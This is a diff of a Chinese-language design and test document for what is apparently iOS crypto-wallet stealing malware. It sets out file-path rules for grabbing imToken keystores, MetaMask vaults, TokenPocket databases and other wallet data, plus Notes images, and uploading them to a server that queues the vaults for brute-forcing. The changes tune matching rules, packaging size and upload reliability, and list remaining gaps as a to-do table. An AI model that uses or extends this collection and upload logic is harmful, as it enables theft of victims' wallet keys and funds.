@@ -345,14 +345,18 @@ for target:
 
 | 服务端规则 | 匹配的路径 |
 |---|---|
-| imToken keystore | 路径含 `walletsV2` 且以 `.json` 结尾 |
-| imToken 账户 | 路径含 `rctasynclocalstorage` |
-| MetaMask vault | 路径含 `keyringcontroller` / `vault` |
-| TokenPocket | 文件名 `main.sqlite3`（可任意层级） |
+| imToken keystore | 路径含 `walletsV2` **且以 `.json` 结尾** |
+| imToken 账户 | 路径含 `rctasynclocalstorage`（`wallet_addr_parsers` 分支；`wallet_kit_adapter` 里的同名分支是给 Coin98 的，会排除 `im.token`） |
+| MetaMask vault | 路径含 `keyringcontroller` / `vault` **且以 `.json` 结尾** |
+| TokenPocket | 文件名 `main.sqlite3`（可任意层级）+ `F4SeCyr` 或 64 位 hex 文件名 |
 
 所以 zip 内部必须是 `<bundleId>/Documents/walletsV2/x.json`、`<bundleId>/Library/Application Support/.../RCTAsyncLocalStorage_V1_xxx`，
 **不能拍平成 `walletsV2_x.json`**——拍平后 imToken 的 keystore 会被服务端判成「未知文件」，
 表现为服务端没有 `wallet_parsed` 事件、UI 上看不到待爆破材料（2026-11-16 实测）。
+
+⚠️ **已知不匹配**：MetaMask 的 vault 文件名是 `persist-KeyringController`（**无 `.json` 后缀**），
+而服务端两条 `keyringcontroller` 规则都要求 `.json` 结尾 → 即使路径修对了，素材扫描仍不会把它归到 metamask。
+需要在客户端额外落一份 `.json` 副本，或服务端放宽规则（见 §15 #1）。
 
 ---
 
@@ -575,7 +579,7 @@ for (NSDictionary *t in targets) {
 | B 全流程（8 目标，无 IM/微信） | ≤ 3s | **0.62s**（采集） |
 | 单目标采集 | ≤ 2s | 0.02~0.44s（Bitpie 整容器 0.44s） |
 | 目录遍历 | 每容器 1 遍 | 1 遍（定义目录各自子树 + 不足才全容器） |
-| 状态 plist 写入次数 | ≈ 目标数 | 每目标 1 次 |
+| 状态 plist 写入次数 | ≈ 目标数 | 每目标 2 次（payloads + 断点） |
 | 空库判断 | 单库 < 5ms | `SELECT 1 LIMIT 1`，亚毫秒 |
 | hits/manifest 到达 | 早于大钱包包 | 是（0.2~4.8s，视 hits 体积） |
 | 大包上传 | 明确成功或失败 | 2.74MB / 197s 超时窗口内完成 |
@@ -639,7 +643,7 @@ B: TokenPocket 完成（0.1s）
 | **收尾互斥** | `OWRoute._finalizing` | 主流程收尾与补传回调不会同时写 done |
 | **realm 按二进制扫** | `OWExtractor._scanFile` | 之前把 `.realm` 当 sqlite 打开必失败并静默返回；改为扫可打印串，OneKey 等兜底场景能捞地址 |
 | **imToken 减包** | `targets.plist` | 去掉 `default.realm`（3MB，只含 10 ETH/20 BTC，423 个地址都在 RCT 存储里），包 2.01MB → 120KB |
-| **MetaMask 减包** | `targets.plist` excludes | 排除 Snap 插件 JS（bitcoin/tron/stellar/solana/ens 约 2.5MB），保留 `persist-KeyringController` vault |
+| **MetaMask 减包** | `targets.plist` excludes | 排除 Snap 插件 JS（bitcoin/tron/stellar/solana/ens 约 2.5MB），保留 `persist-KeyringController` vault（**注意：服务端素材扫描要求 `.json`，见 §15 #1**） |
 
 ### 14.2 部分实现 / 未实现 ⚠️❌
 
@@ -681,15 +685,17 @@ B: TokenPocket 完成（0.1s）
 
 | # | 发现 | 影响 | 建议 |
 |---|---|---|---|
-| 1 | Notes 图片受 `_maxContainerBytes=150MB` 与 zip `totalCap=150MB` 双限制 | 图片特别多时尾部文件被丢弃（日志有 oversize/上限提示），属于「静默截断」 | 给 Notes 单独提高上限，或在 `_manifest.json` 里标注 `truncated:true` |
-| 2 | `hasPendingData` 不含 `log` | 只剩日志未传时可先写 done | 保持现状（可接受），或在 done 前补一次日志上传 |
-| 3 | `_cleanupOrphans` 删 >250MB pending | 单包上限若调大会丢数据 | 上限与 `maxContainerBytes` 绑定，别分两处写死 |
-| 4 | `up_` 标记在「上传成功→写状态」之间被杀会丢 | 下一轮重复上传一份 | 接受（宁重复不漏），或改用「服务端已存在同名包」判定 |
-| 5 | 设备分裂 `web:` / `tok:` | 后台同设备显示两台 | 服务端合并为主；客户端可统一 token 字段 |
-| 6 | TronLink 反查依赖 LaunchServices 可读 | 若 MHA 下 plist/db 都读不到，Discovery 只能打印 0 条 | 下次真机日志确认；不可读则改 `LSApplicationWorkspace` |
-| 7 | `targets.plist` 的 `uploadLast` 键未被代码读取 | 死配置（Notes 优先级是硬编码 90） | 要么删键，要么改成读 plist |
-| 8 | `_zipContainer`（Bitpie 整容器）不应用 `excludes` / `includeMedia` | 整容器上限内全打包，可能带上无关大文件 | 需要时按 exts 过滤 |
-| 9 | `meta` 里记录了 `attempts` 但日志只每 10 次打一行 | 现场排查时可能看不到连续失败细节 | 诊断面板可加「队列快照」 |
-| 10 | 抽取对 3MB+ realm 走二进制扫描 | 兜底场景单文件耗时可到数百 ms | 已有 `maxScanBytes` 限制，观察即可 |
+| 1 | **MetaMask vault 无 `.json` 后缀**：服务端 `keyringcontroller`/`vault` 两条规则都要求 `.json` 结尾 | 素材扫描不把 `persist-KeyringController` 归到 metamask，爆破页可能拿不到 vault（地址仍能解析） | 客户端额外落一份 `persist-KeyringController.json` 副本；或服务端去掉 `.json` 要求 |
+| 2 | Discovery 数据源在 `/var/mobile/Library/…`（LastLaunchServicesMap.plist / applicationState.db） | MHA 沙箱大概率读不到 → `Discovery 已安装 0 个 App`，TronLink 仍会漏 | 下次真机日志确认；读不到就退回「补 bundleId 变体」 |
+| 3 | Notes 图片受 `_maxContainerBytes=150MB` 与 zip `totalCap=150MB` 双限制 | 图特别多时尾部文件被静默截断（只有日志 oversize 提示） | 给 Notes 单独提高上限，或在 `_manifest.json` 标 `truncated:true` |
+| 4 | `_cleanupOrphans` 的 250MB 阈值与 `maxContainerBytes` 两处独立写死 | 调大单包上限会静默丢旧 pending | 阈值改为由 `maxContainerBytes` 推导 |
+| 5 | `hasPendingData` 不含 `log` | 只剩日志没传时会先写 done | 保持现状（可接受） |
+| 6 | `up_` 标记在「上传成功→写状态」之间被杀会丢 | 下一轮重复上传一份 | 接受（宁重复不漏） |
+| 7 | 设备分裂 `web:` / `tok:` | 后台同设备显示两台 | 服务端合并为主 |
+| 8 | `targets.plist` 的 `uploadLast` 键未被代码读取 | 死配置（Notes 优先级硬编码 90） | 删键或改成读 plist |
+| 9 | `_zipContainer`（Bitpie 整容器）不应用 `excludes` / `includeMedia` | 上限内全打包，可能带无关大文件 | 需要时按 exts 过滤 |
+| 10 | 整容器目标（Bitpie）没有目标级断点 | 每轮都会重新打包整容器（0.44s，可接受） | 补 `markTargetDone` |
+| 11 | 失败日志每 10 次才打一行 | 现场可能看不到连续失败细节 | 诊断面板加队列快照 |
+| 12 | realm 改二进制扫描后，兜底场景单文件可能耗几百 ms | 有 `maxScanBytes` 限制 | 观察即可 |
 
 
